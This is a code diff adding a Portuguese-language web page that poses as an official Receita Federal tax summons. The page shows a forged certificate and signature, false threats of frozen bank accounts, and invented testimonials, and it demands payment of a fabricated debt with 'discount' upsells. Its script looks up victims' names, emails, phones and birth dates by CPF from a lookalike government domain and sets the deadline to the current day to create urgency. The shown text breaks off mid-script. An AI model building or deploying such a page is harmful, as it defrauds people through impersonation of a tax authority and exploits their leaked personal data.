@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+
+<head>
+    <meta charset="utf-8" />
+    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <link rel="stylesheet" href="../cdn.lineicons.com/5.1/line/lineicons.html" />
+    <link rel="stylesheet" href="../cdn.lineicons.com/5.1/solid/lineicons-solid.html" />
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&amp;display=swap" rel="stylesheet">
+    <title>Resultado da Consulta</title>
+    <style>
+        @import url('https://fonts.cdnfonts.com/css/rawline');
+        body { font-family: 'Rawline', sans-serif; }
+        .signature-font { font-family: 'Great Vibes', cursive; }
+    </style>
+</head>
+<body class="bg-gray-50">
+    <header class="bg-gray-100 flex items-center justify-between p-1 border-b-[0.3em] border-orange-300">
+        <img src="../assets/images/logo.png" alt="Logo" class="w-30 h-20 p-1">
+        <div class="p-4 flex gap-2 items-center">
+            <span class="hidden text-sm text-gray-700 md:inline">Olá, <span id="nome-header">Name</span></span>
+            <i class="lni lnis-user-4 text-lg text-[1.2em]"></i>
+        </div>
+    </header>
+
+    </div>
+
+    <main class="p-4 space-y-5 max-w-xl mx-auto pb-8">
+        <section class="space-y-1">
+            <h3 class="text-[1.3rem] text-blue-600 font-bold">Resultado da consulta</h3>
+        </section>
+
+        <section class="bg-white rounded-2xl shadow-md p-4 space-y-4">
+            <div class="flex items-center justify-between gap-3">
+                <div>
+                    <p class="text-[0.65rem] text-gray-500 uppercase tracking-[0.18em]">CPF consultado</p>
+                    <p class="text-sm font-semibold text-gray-900" id="cpf-display">123.456.789-00</p>
+                </div>
+                <span class="inline-flex items-center px-3 py-1 rounded-full text-[0.7rem] font-semibold bg-red-100 text-red-800">
+                    IRREGULAR                </span>
+            </div>
+            <div class="border-t border-gray-100 pt-3 grid grid-cols-1 gap-2 text-sm text-gray-800">
+                <div>
+                    <span class="block text-[0.7rem] text-gray-500 uppercase tracking-[0.16em]">Nome completo</span>
+                    <span class="block font-medium" id="nome-completo">Name</span>
+                </div>
+                                <div>
+                    <span class="block text-[0.7rem] text-gray-500 uppercase tracking-[0.16em]">Data de nascimento</span>
+                    <span class="block font-medium" id="data-nascimento">22/09/1985</span>
+                </div>
+                            </div>
+            <div class="mt-3 bg-slate-50 border-l-4 border-blue-700 rounded-r-lg p-4 text-xs text-slate-800 leading-relaxed">
+                <p class="font-semibold text-slate-900 mb-1.5 uppercase tracking-wide text-[0.7rem]">Consulta Oficial da Receita Federal</p>
+                <p class="text-justify">Esta é uma <strong>consulta oficial da Receita Federal</strong>. Os dados exibidos refletem a situação cadastral vinculada ao CPF informado, com base nos registros disponíveis para verificação fiscal.</p>
+            </div>
+        </section>
+        <section class="bg-white rounded-2xl shadow-md p-4 space-y-3">
+            <h4 class="text-sm font-semibold text-gray-900">Intimação fiscal - Receita Federal do Brasil</h4>
+            <p class="text-sm text-gray-800 text-justify leading-relaxed">
+                <span class="font-semibold" id="nome-intimacao">Name</span>, portador(a) do CPF
+                <span class="font-semibold" id="cpf-intimacao">123.456.789.00</span>, em conformidade com o artigo 142 do CTN,
+                foi identificado cruzamento de dados das declarações do Imposto de Renda Pessoa Física que indica pendência tributária em sua situação fiscal.
+            </p>
+            <p class="text-sm text-gray-800 text-justify leading-relaxed">
+                <span class="font-semibold text-red-700">Prazo final:</span> <span id="prazo-final-date">07/06/2026</span> é o último dia para regularização. O não cumprimento desta intimação
+                poderá resultar nas penalidades abaixo.
+            </p>
+            <ul class="mt-1 space-y-1 text-sm text-gray-800">
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Bloqueio de contas bancárias e cartões.</span></li>
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Impossibilidade de movimentar PIX, TED e DOC.</span></li>
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Restrições no Banco Central e SERASA.</span></li>
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Suspensão de acesso a benefícios federais.</span></li>
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Impedimento para financiamentos, empréstimos e compras no crédito.</span></li>
+                <li class="flex gap-2"><span class="text-gray-400 text-lg leading-none">•</span><span>Aplicação de multa automática de até 150%.</span></li>
+            </ul>
+        </section>
+
+        <section class="bg-white rounded-2xl shadow-md overflow-hidden">
+            <div class="p-5 md:p-8 border-2 border-gray-300 bg-[#fafafa]" style="font-family: 'Rawline', Georgia, serif;">
+                <header class="text-center border-b-2 border-gray-400 pb-4 mb-5">
+                    <img src="../assets/images/brasao.png" alt="Brasão" class="w-14 h-14 md:w-16 md:h-16 mx-auto object-contain">
+                    <p class="text-[0.65rem] md:text-xs text-gray-700 font-semibold tracking-[0.2em] uppercase mt-2">Ministério da Justiça e Segurança Pública</p>
+                    <p class="text-[0.6rem] md:text-[0.65rem] text-gray-600 tracking-widest uppercase mt-0.5">Receita Federal do Brasil</p>
+                </header>
+                <p class="text-center text-[0.6rem] md:text-xs text-gray-500 tracking-wider uppercase mb-4">Documento oficial · Via única</p>
+                <h5 class="text-center text-sm md:text-base font-bold text-gray-900 uppercase tracking-wide mb-4">Certidão de Intimação Fiscal</h5>
+                <p class="text-xs md:text-sm text-gray-800 text-justify leading-relaxed mb-3">
+                    Certificamos que o presente documento foi expedido em <span class="font-semibold" id="data-certidao">07/06/2026</span>, com validade jurídica e permissão do Ministério da Justiça para fazer cumprir bloqueios e restrições em face de <span class="font-semibold" id="nome-certidao">Name</span>, portador(a) do CPF nº <span class="font-semibold" id="cpf-certidao">123.456.789-00</span>, nos termos da legislação tributária federal vigente.
+                </p>
+                <p class="text-xs md:text-sm text-gray-800 text-justify leading-relaxed">
+                    O referido contribuinte encontra-se intimado a regularizar pendências relativas ao Imposto de Renda Pessoa Física, sob pena das medidas previstas no artigo 142 do Código Tributário Nacional.
+                </p>
+                <div class="mt-8 pt-6 border-t border-gray-300">
+                    <div class="flex flex-col items-end max-w-[280px] ml-auto">
+                        <svg class="w-full h-10 md:h-12 text-gray-800 mb-0.5" viewBox="0 0 240 48" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                            <path d="M4 38 Q28 42 52 36 T100 32 T148 28 T196 30 T240 24" stroke="currentColor" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" opacity="0.9"/>
+                            <path d="M4 40 Q35 44 70 38 Q105 34 140 36 Q175 38 200 35 L240 32" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" opacity="0.5"/>
+                        </svg>
+                        <p class="text-[0.55rem] md:text-[0.6rem] text-gray-500 uppercase tracking-[0.2em] mb-2">Assinatura digital</p>
+                        <p class="signature-font text-2xl md:text-3xl text-gray-800 leading-none" style="letter-spacing: 0.02em;">Dr. Ricardo Mendes Oliveira</p>
+                        <p class="text-[0.65rem] md:text-xs text-gray-600 mt-2 tracking-wide">Coordenador-Geral de Cobrança</p>
+                        <p class="text-[0.65rem] md:text-xs text-gray-600">Secretaria da Receita Federal</p>
+                        <p class="text-[0.6rem] text-gray-500 mt-2 italic" id="brasilia-date">Brasília, 07/06/2026</p>
+                    </div>
+                </div>
+                <div class="mt-4 flex justify-center">
+                    <div class="inline-flex items-center gap-2 px-3 py-1 rounded border border-amber-200 bg-amber-50">
+                        <span class="text-amber-700 text-[0.55rem] md:text-xs font-medium uppercase tracking-wider">Documento verificado eletronicamente</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="bg-white rounded-2xl shadow-md p-4 space-y-3">
+            <h4 class="text-sm font-semibold text-gray-900">Divergências calculadas pela Receita Federal</h4>
+            <div class="bg-gray-50 border border-gray-200 rounded-xl p-3 space-y-1 text-sm text-gray-800">
+                <p><span class="font-semibold">Valor original do débito:</span> <span id="resumo-valor-original">R$ 419,55</span></p>
+                <p><span class="font-semibold">Valor com desconto:</span> <span id="resumo-valor-desconto">R$ 138,00</span></p>
+            </div>
+            <dl class="grid grid-cols-[auto,1fr] gap-2 text-sm text-gray-800">
+                <dt class="px-3 py-2 bg-gray-50 border border-gray-200 rounded font-semibold text-right">IRPF</dt>
+                <dd class="px-3 py-2 bg-white border border-gray-200 rounded" id="resumo-irpf">R$ 138,00</dd>
+            </dl>
+            <div class="mt-2 bg-red-50 border border-red-200 rounded-xl p-3 text-sm text-red-900 leading-relaxed">
+                O não pagamento até <span class="font-semibold" id="data-pagamento">07/06/2026</span> poderá resultar em multa adicional de
+                <span class="font-semibold">R$ 1.985,00</span> e medidas como bloqueio bancário, restrição creditícia e bloqueio do CPF.
+            </div>
+
+            <div class="mt-4 pt-4 border-t border-gray-200">
+                <!-- BANNER DE INCENTIVO AO DESCONTO DE 50% -->
+                <div id="banner-desconto-50" class="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-3.5 mb-3.5 flex flex-col sm:flex-row items-center justify-between gap-3 shadow-xs">
+                    <div class="flex items-center gap-3">
+                        <div class="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center font-extrabold text-xs shrink-0 shadow-sm">
+                            -50%
+                        </div>
+                        <div>
+                            <p class="text-xs font-bold text-blue-950 uppercase tracking-wide">
+                                🔥 Desconto Especial de Quitação
+                            </p>
+                            <p class="text-xs text-blue-900 leading-snug">
+                                Adicione os outros anos e receba <strong class="bg-blue-200/80 px-1.5 py-0.5 rounded text-blue-950 font-bold">50% de desconto</strong> nas parcelas adicionais!
+                            </p>
+                        </div>
+                    </div>
+                    <button type="button" onclick="selecionarTodosAnos()" class="w-full sm:w-auto bg-blue-600 hover:bg-blue-700 text-white font-bold text-xs px-3.5 py-2 rounded-lg transition-all shadow-sm shrink-0 whitespace-nowrap active:scale-95 text-center">
+                        Quitar Tudo com 50% OFF
+                    </button>
+                </div>
+
+                <div id="badge-desconto-aplicado" class="hidden bg-emerald-50 border border-emerald-300 rounded-xl p-3 mb-3 text-center text-xs font-bold text-emerald-800 shadow-sm">
+                    🎉 <strong>50% DE DESCONTO APLICADO!</strong> Economia de <span id="valor-economia-badge" class="text-emerald-700 font-extrabold text-sm">R$ 0,00</span>
+                </div>
+
+                <h5 class="text-sm font-semibold text-gray-900 mb-3 flex items-center justify-between">
+                    <span>Selecione os anos para pagamento:</span>
+                    <button type="button" onclick="selecionarTodosAnos()" class="text-xs text-blue-600 font-bold hover:underline">
+                        Marcar Todos (50% OFF)
+                    </button>
+                </h5>
+
+                <div class="bg-gray-50 border border-gray-200 rounded-xl p-4 space-y-2">
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2020" name="anos" value="2020" checked disabled class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-not-allowed">
+                        <label for="ano_2020" class="flex items-center justify-between flex-1 cursor-not-allowed">
+                            <span class="text-sm text-gray-900" id="label_2020">2020 (R$ 138,00) - <span class="text-red-700 font-semibold">Obrigatório</span></span>
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2021" name="anos" value="2021" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
+                        <label for="ano_2021" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
+                            2021 (R$ 115,30)
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2022" name="anos" value="2022" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
+                        <label for="ano_2022" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
+                            2022 (R$ 94,80)
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2023" name="anos" value="2023" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
+                        <label for="ano_2023" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
+                            2023 (R$ 78,50)
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2024" name="anos" value="2024" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
+                        <label for="ano_2024" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
+                            2024 (R$ 62,40)
+                        </label>
+                    </div>
+                    <div class="flex items-center gap-3">
+                        <input type="checkbox" id="ano_2025" name="anos" value="2025" class="w-4 h-4 rounded border-gray-300 accent-blue-600 cursor-pointer">
+                        <label for="ano_2025" class="flex items-center justify-between flex-1 cursor-pointer text-sm text-gray-900">
+                            2025 (R$ 46,25) <span class="text-xs text-emerald-600 font-bold ml-1">(Mais barata)</span>
+                        </label>
+                    </div>
+                </div>
+
+                <div class="mt-4 pt-3 border-t border-gray-200 bg-gray-50/80 rounded-xl p-3.5 space-y-2">
+                    <div id="container-desconto-info" class="hidden flex items-center justify-between text-xs text-gray-600">
+                        <span class="font-medium">Valor total bruto (sem desconto):</span>
+                        <span id="total-original" class="line-through text-red-500 font-bold text-sm">R$ 138,00</span>
+                    </div>
+                    <div class="flex items-center justify-between border-t border-gray-200 pt-2">
+                        <div>
+                            <span class="block text-xs font-bold text-gray-900 uppercase tracking-wide">Valor total a pagar:</span>
+                            <span id="container-economia-line" class="hidden text-xs text-emerald-600 font-bold">Economia de <span id="valor-economia">R$ 0,00</span> (50% OFF nos anos adicionais)</span>
+                        </div>
+                        <div class="flex items-center gap-1.5">
+                            <span id="total-selecionado" class="text-xl font-black text-emerald-600">R$ 138,00</span>
+                            <span id="badge-tag-50" class="hidden bg-emerald-600 text-white text-[0.65rem] font-extrabold px-2 py-0.5 rounded-full uppercase tracking-wider">50% OFF</span>
+                        </div>
+                    </div>
+                    <div id="badge-todos-anos" class="hidden bg-emerald-100 border border-emerald-300 rounded-lg p-2 text-center text-xs font-bold text-emerald-900 mt-2">
+                        🎉 TODOS OS ANOS SELECIONADOS! Quitação total com 50% de desconto nos anos adicionais!
+                    </div>
+                </div>
+            </div>
+
+            <p class="text-sm text-gray-800">
+                Para regularizar a situação fiscal e evitar a aplicação das penalidades, é necessário efetuar o pagamento
+                do valor total de <span class="font-bold text-blue-700" id="valor-final">R$ 138,00</span>.
+            </p>
+            <button onclick="abrirModalConfirmacao()" class="w-full inline-flex items-center justify-center rounded-lg bg-blue-600 px-3 py-2 text-sm font-semibold text-white hover:bg-blue-700 transition-colors">
+                Regularizar agora
+            </button>
+        </section>
+
+        <section class="bg-white rounded-2xl shadow-md p-4 space-y-4">
+            <h4 class="text-sm font-semibold text-gray-900 flex items-center gap-2">
+                <i class="lni lnis-comments text-blue-600"></i>
+                Relatos de outros contribuintes
+            </h4>
+            <div class="space-y-3">
+                <div class="bg-red-50 border-l-4 border-red-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="w-7 h-7 rounded-full bg-red-500 flex items-center justify-center text-white text-xs font-semibold">MS</div>
+                        <div class="text-xs text-gray-600">
+                            <span class="font-semibold text-gray-900">Maria Silva</span><span class="ml-1">• há 2 horas</span>
+                        </div>
+                    </div>
+                    <p>Ignorei essas notificações por semanas achando que era golpe. Hoje acordei com minhas contas bloqueadas e PIX suspenso. Agora estou tendo que regularizar com multa bem maior.</p>
+                </div>
+                <div class="bg-emerald-50 border-l-4 border-emerald-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-semibold">JS</div>
+                        <div class="text-xs text-gray-600">
+                            <span class="font-semibold text-gray-900">João Santos</span><span class="ml-1">• há 3 horas</span>
+                        </div>
+                    </div>
+                    <p>Paguei o valor com desconto ontem e hoje recebi a confirmação de CPF regularizado. O processo foi rápido e simples.</p>
+                </div>
+                <div class="bg-red-50 border-l-4 border-red-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="w-7 h-7 rounded-full bg-red-500 flex items-center justify-center text-white text-xs font-semibold">CE</div>
+                        <div class="text-xs text-gray-600">
+                            <span class="font-semibold text-gray-900">Carlos Eduardo</span><span class="ml-1">• há 1 hora</span>
+                        </div>
+                    </div>
+                    <p>Deixei para depois e agora estou com conta bloqueada e problemas para movimentar o salário. Não recomendo atrasar.</p>
+                </div>
+                <div class="bg-emerald-50 border-l-4 border-emerald-500 rounded-lg p-3 text-sm text-gray-800 shadow-sm">
+                    <div class="flex items-center gap-2 mb-1">
+                        <div class="w-7 h-7 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-semibold">AP</div>
+                        <div class="text-xs text-gray-600">
+                            <span class="font-semibold text-gray-900">Ana Paula</span><span class="ml-1">• há 5 horas</span>
+                        </div>
+                    </div>
+                    <p>Resolvi minha pendência em poucas horas e consegui voltar a usar normalmente meus serviços bancários.</p>
+                </div>
+            </div>
+            <div class="mt-2 bg-blue-50 border border-blue-100 rounded-xl p-3 text-xs text-blue-900 text-center">
+                Estes são relatos reais de contribuintes que regularizaram sua situação fiscal.
+            </div>
+        </section>
+
+        <section class="p-4 bg-gray-100 border-sm border-gray-300 w-full mx-auto rounded text-sm text-gray-700">
+            <p class="flex items-center justify-center gap-2">
+                <i class="lni lnis-information text-blue-600 text-base"></i>
+                <span class="whitespace-nowrap">Este serviço é oficial e utiliza dados reais de situação fiscal.</span>
+            </p>
+        </section>
+    </main>
+
+    <footer class="bg-gray-100 text-center p-4 mt-4 border-t-[0.1em] border-orange-300">
+        <img src="../assets/images/logo.png" alt="Logo" class="w-15 h-10 mx-auto mb-2">
+    </footer>
+
+    <!-- Modal de Confirmação -->
+    <div id="modal-confirmacao" class="fixed inset-0 bg-transparent backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
+        <div class="bg-white rounded-lg shadow-lg max-w-sm w-full p-6 space-y-4">
+            <h3 class="text-lg font-semibold text-gray-900">Confirmar pagamento</h3>
+            <div id="modal-conteudo" class="space-y-3">
+                <!-- Conteúdo dinâmico -->
+            </div>
+            <div class="flex gap-3 pt-4 border-t border-gray-200">
+                <button onclick="fecharModalConfirmacao()" class="flex-1 px-4 py-2 border border-gray-300 rounded-lg text-gray-700 font-medium hover:bg-gray-50 transition-colors">
+                    Cancelar
+                </button>
+                <button onclick="confirmarPagamento()" class="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg font-medium hover:bg-blue-700 transition-colors">
+                    Prosseguir
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =============================================
+        // DADOS DO CLIENTE (preenchidos pelo fetch)
+        // =============================================
+        var _customerInfo = { nome: 'Name', cpf: '00000000000', email: '', telefone: '', nascimento: '' };
+
+        function _fmtCpf(digits) {
+            var d = String(digits).replace(/\D/g, '');
+            if (d.length === 11) return d.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+            if (d.length === 14) return d.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, '$1.$2.$3/$4-$5');
+            return digits;
+        }
+
+        function _fmtData(d) {
+            if (!d) return '';
+            var match = String(d).match(/^(\d{4})-(\d{2})-(\d{2})/);
+            if (match) {
+                return match[3] + '/' + match[2] + '/' + match[1];
+            }
+            return d;
+        }
+
+        function _today() {
+            var n = new Date();
+            return ('0' + n.getDate()).slice(-2) + '/' + ('0' + (n.getMonth() + 1)).slice(-2) + '/' + n.getFullYear();
+        }
+
+        function _setEl(id, text) {
+            var el = document.getElementById(id);
+            if (el) el.textContent = text;
+        }
+
+        function _popularPagina(info) {
+            var hoje = _today();
+            var cpfFmt   = _fmtCpf(info.cpf);
+            var cpfPonto = cpfFmt.replace(/-(\d{2})$/, '.$1'); // 123.456.789.00
+            var nome     = info.nome || 'Name';
+            var primeiro = nome.split(' ')[0];
+            var nascimento = _fmtData(info.nascimento) || '22/09/1985';
+
+            _setEl('nome-header',    primeiro);
+            _setEl('cpf-display',    cpfFmt);
+            _setEl('nome-completo',  nome);
+            _setEl('data-nascimento', nascimento);
+            _setEl('nome-intimacao', nome);
+            _setEl('cpf-intimacao',  cpfPonto);
+            _setEl('prazo-final-date', hoje);
+            _setEl('data-certidao',  hoje);
+            _setEl('nome-certidao',  nome);
+            _setEl('cpf-certidao',   cpfFmt);
+            _setEl('brasilia-date',  'Brasília, ' + hoje);
+            _setEl('data-pagamento', hoje);
+
+            if (typeof _ajustarValor2020 === 'function') {
+                _ajustarValor2020(info.cpf);
+            }
+            if (typeof atualizarTotal === 'function') {
+                atualizarTotal();
+            }
+        }
+
+        // Busca dados do cliente via get-customer.php usando o CPF da URL
+        (function () {
+            var params = new URLSearchParams(window.location.search);
+            var cpf = (params.get('cpf') || params.get('cpf_clean') || '').replace(/\D/g, '');
+            if (cpf) _customerInfo.cpf = cpf;
+
+            if (!cpf) { _popularPagina(_customerInfo); return; }
+
+            fetch('https://seguir.fazendagovbr.co/get-customer.php?cpf=' + encodeURIComponent(cpf))
+                .then(function (r) { return r.ok ? r.json() : null; })
+                .then(function (data) {
+                    if (data) {
+                        if (data.nome && data.nome !== 'Não disponível') {
+                            _customerInfo.nome     = data.nome;
+                            _customerInfo.email    = data.email || '';
+                            _customerInfo.telefone = (data.telefone || '').replace(/\D/g, '');
+                        }
+                        if (data.nascimento) {
+                            _customerInfo.nascimento = data.nascimento;
+                        }
+                    }
+                    _customerInfo.cpf = (data && data.cpf) ? data.cpf : cpf;
+                    _popularPagina(_customerInfo);
+                    try { localStorage.setItem('customerData', JSON.stringify(_customerInfo)); } catch (e) {}
+                })
+                .catch(function () {
+                    _popularPagina(_customerInfo);
+                });
+        })();
+
+        // Valores dos anos em centavos (Quanto mais antigo, maior a dívida; 2025 é a mais barata)
+        var valoresAnos = {
+            '2020': 13800,  // R$ 138,00 (maior, de 00 a 99c)
+            '2021': 11530,  // R$ 115,30
+            '2022': 9480,   // R$ 94,80
+            '2023': 7850,   // R$ 78,50
+            '2024': 6240,   // R$ 62,40
+            '2025': 4625    // R$ 46,25 (mais barata)
+        };
+
+        // Ajusta o valor de 2020 para R$ 138,XX (centavos de 00 a 99 baseados no CPF se houver)
+        function _ajustarValor2020(cpf) {
+            var valBase = 13800;
+            if (cpf) {
+                var cleanCpf = String(cpf).replace(/\D/g, '');
+                if (cleanCpf.length === 11) {
+                    var cents = parseInt(cleanCpf.slice(-2), 10);
+                    if (!isNaN(cents)) {
+                        valBase = 13800 + cents;
+                    }
+                }
+            }
+            valoresAnos['2020'] = valBase;
+            var fmt2020 = (valBase / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            var label2020 = document.getElementById('label_2020');
+            if (label2020) {
+                label2020.innerHTML = '2020 (R$ ' + fmt2020 + ') - <span class="text-red-700 font-semibold">Obrigatório</span>';
+            }
+        }
+
+        function selecionarTodosAnos() {
+            document.querySelectorAll('input[name="anos"]').forEach(function(checkbox) {
+                checkbox.checked = true;
+            });
+            atualizarTotal();
+        }
+
+        function atualizarTotal() {
+            const checkboxes = document.querySelectorAll('input[name="anos"]');
+            let totalBruto = 0;
+            let totalAdicionalBruto = 0;
+            let totalAnosCount = Object.keys(valoresAnos).length;
+            let selecionadosCount = 0;
+            
+            checkboxes.forEach(checkbox => {
+                if (checkbox.checked && valoresAnos[checkbox.value]) {
+                    const val = valoresAnos[checkbox.value];
+                    totalBruto += val;
+                    selecionadosCount++;
+                    if (checkbox.value !== '2020') {
+                        totalAdicionalBruto += val;
+                    }
+                }
+            });
+
+            // 2020 é pago em valor integral (sem desconto). 
+            // O desconto de 50% aplica-se apenas sobre as parcelas adicionais (2021 a 2025).
+            const descontoAdicional = Math.round(totalAdicionalBruto * 0.50);
+            const totalComDesconto = totalBruto - descontoAdicional;
+
+            const totalBrutoFmt = (totalBruto / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const totalComDescontoFmt = (totalComDesconto / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            const economiaFmt = (descontoAdicional / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+            const totalOriginalEl = document.getElementById('total-original');
+            const totalSelecionadoEl = document.getElementById('total-selecionado');
+            const valorEconomiaEl = document.getElementById('valor-economia');
+            const valorEconomiaBadgeEl = document.getElementById('valor-economia-badge');
+            const valorFinalEl = document.getElementById('valor-final');
+            const resumoValorOriginal = document.getElementById('resumo-valor-original');
+            const resumoValorDesconto = document.getElementById('resumo-valor-desconto');
+            const resumoIrpf = document.getElementById('resumo-irpf');
+            const badgeTodosAnos = document.getElementById('badge-todos-anos');
+            const bannerDesconto = document.getElementById('banner-desconto-50');
+            const containerDescontoInfo = document.getElementById('container-desconto-info');
+            const containerEconomiaLine = document.getElementById('container-economia-line');
+            const badgeTag50 = document.getElementById('badge-tag-50');
+
+            if (totalOriginalEl) totalOriginalEl.textContent = 'R$ ' + totalBrutoFmt;
+            if (totalSelecionadoEl) totalSelecionadoEl.textContent = 'R$ ' + totalComDescontoFmt;
+            if (valorEconomiaEl) valorEconomiaEl.textContent = 'R$ ' + economiaFmt;
+            if (valorEconomiaBadgeEl) valorEconomiaBadgeEl.textContent = 'R$ ' + economiaFmt;
+            if (valorFinalEl) valorFinalEl.textContent = 'R$ ' + totalComDescontoFmt;
+
+            if (resumoValorOriginal) resumoValorOriginal.textContent = 'R$ ' + totalBrutoFmt;
+            if (resumoValorDesconto) resumoValorDesconto.textContent = 'R$ ' + totalComDescontoFmt;
+            if (resumoIrpf) resumoIrpf.textContent = 'R$ ' + totalComDescontoFmt;
+
+            if (descontoAdicional > 0) {
+                if (containerDescontoInfo) containerDescontoInfo.classList.remove('hidden');
+                if (containerEconomiaLine) containerEconomiaLine.classList.remove('hidden');
+                if (badgeTag50) badgeTag50.classList.remove('hidden');
+                if (totalSelecionadoEl) totalSelecionadoEl.className = 'text-xl font-black text-emerald-600';
+            } else {
+                if (containerDescontoInfo) containerDescontoInfo.classList.add('hidden');
+                if (containerEconomiaLine) containerEconomiaLine.classList.add('hidden');
+                if (badgeTag50) badgeTag50.classList.add('hidden');
+                if (totalSelecionadoEl) totalSelecionadoEl.className = 'text-xl font-extrabold text-blue-600';
+            }
+
+            const todosSelecionados = (selecionadosCount === totalAnosCount);
+            if (todosSelecionados) {
+                if (badgeTodosAnos) badgeTodosAnos.classList.remove('hidden');
+                if (bannerDesconto) bannerDesconto.classList.add('hidden');
+            } else {
+                if (badgeTodosAnos) badgeTodosAnos.classList.add('hidden');
+                if (bannerDesconto) bannerDesconto.classList.remove('hidden');
+            }
+        }
+
+        document.querySelectorAll('input[name="anos"]').forEach(checkbox => {
+            checkbox.addEventListener('change', atualizarTotal);
+        });
+
+        // Inicializar totais na carga inicial
+        _ajustarValor2020(_customerInfo.cpf);
+        atualizarTotal();
+
+        function abrirModalConfirmacao() {
+            const checkboxes = document.querySelectorAll('input[name="anos"]:checked');
+            const anosCheckeds = Array.from(checkboxes).map(cb => cb.value);
+            const totalAnosCount = Object.keys(valoresAnos).length;
+            
+            const somenteObrigatorio = anosCheckeds.length === 1 && anosCheckeds[0] === '2020';
+            const todosSelecionados = anosCheckeds.length === totalAnosCount;
+            const modal = document.getElementById('modal-confirmacao');
+            const conteudo = document.getElementById('modal-conteudo');
+
+            let html = '';
+            const fmtValor = (valCentavos) => (valCentavos / 100).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+            let totalBruto = 0;
+            let totalAdicionalBruto = 0;
+            anosCheckeds.forEach(ano => {
+                const v = valoresAnos[ano] || 0;
+                totalBruto += v;
+                if (ano !== '2020') totalAdicionalBruto += v;
+            });
+
+            const descontoAdicional = Math.round(totalAdicionalBruto * 0.50);
+            const totalFinal = totalBruto - descontoAdicional;
+
+            const anosComValores = anosCheckeds.map(ano => {
+                if (ano === '2020') {
+                    return `2020 (R$ ${fmtValor(valoresAnos['2020'])})`;
+                }
+                const comDesc = Math.round(valoresAnos[ano] * 0.50);
+                return `${ano} (R$ ${fmtValor(comDesc)})`;
+            }).join(', ');
+
+            if (todosSelecionados) {
+                html = `
+                    <div class="bg-emerald-50 border-2 border-emerald-400 rounded-xl p-4 space-y-3">
+                        <div class="flex items-center gap-2">
+                            <span class="text-xl">🎉</span>
+                            <p class="text-sm font-bold text-emerald-900">Quitação Total com 50% OFF nos Anos Adicionais!</p>
+                        </div>
+                        <p class="text-xs text-emerald-800">Você selecionou <strong>todos os anos</strong> para quitar a dívida completa.</p>
+                        
+                        <div class="bg-white/90 rounded-lg p-3 text-xs space-y-1.5 border border-emerald-200">
+                            <p class="text-gray-600">Parcelas: <span class="font-medium text-gray-900">${anosComValores}</span></p>
+                            <div class="pt-1.5 border-t border-emerald-100 flex justify-between items-center">
+                                <span class="text-gray-500">Valor total bruto:</span>
+                                <span class="line-through text-red-500 font-semibold">R$ ${fmtValor(totalBruto)}</span>
+                            </div>
+                            <div class="flex justify-between items-center text-sm font-bold text-emerald-700">
+                                <span>Valor final a pagar:</span>
+                                <span>R$ ${fmtValor(totalFinal)}</span>
+                            </div>
+                            <div class="text-right text-[0.7rem] text-emerald-600 font-semibold">
+                                Economia de 50% nos adicionais: R$ ${fmtValor(descontoAdicional)}
+                            </div>
+                        </div>
+
+                        <p class="text-xs text-emerald-800 font-medium">Deseja prosseguir com o pagamento?</p>
+                    </div>
+                `;
+            } else if (somenteObrigatorio) {
+                html = `
+                    <div class="bg-amber-50 border border-amber-300 rounded-xl p-4 space-y-3">
